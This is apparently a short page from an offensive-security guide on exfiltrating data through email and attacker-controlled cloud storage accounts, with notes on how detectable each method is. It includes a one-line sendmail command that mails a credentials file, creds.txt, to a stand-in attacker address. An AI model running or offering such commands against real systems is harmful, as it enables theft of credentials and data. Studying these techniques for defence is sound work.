Email and Cloud Storage Exfiltration

Leveraging common services for data transfer, often requiring compromised credentials.

Email Exfiltration

Data sent as attachments or encoded in the email body to an external address. Requires outbound SMTP access (ports 25, 465, or 587).

Detection Risk

High. Email security gateways often detect suspicious content, large attachments, or unusual external recipients.

# On target (using sendmail if available):
echo "Subject: Exfiltrated Data" | cat - creds.txt | sendmail attacker@example.com

Cloud Storage Exfiltration

Uploading data to an attacker-controlled cloud account (e.g., Google Drive, Dropbox) if user credentials are compromised.

Prerequisite

Requires compromising legitimate user credentials for the cloud service to blend with normal traffic.

Benefit

Blends well with legitimate network traffic, as cloud sync is common in many environments.

Key Takeaway

While convenient, email and cloud storage exfiltration methods carry significant detection risks due to security gateways and activity monitoring.
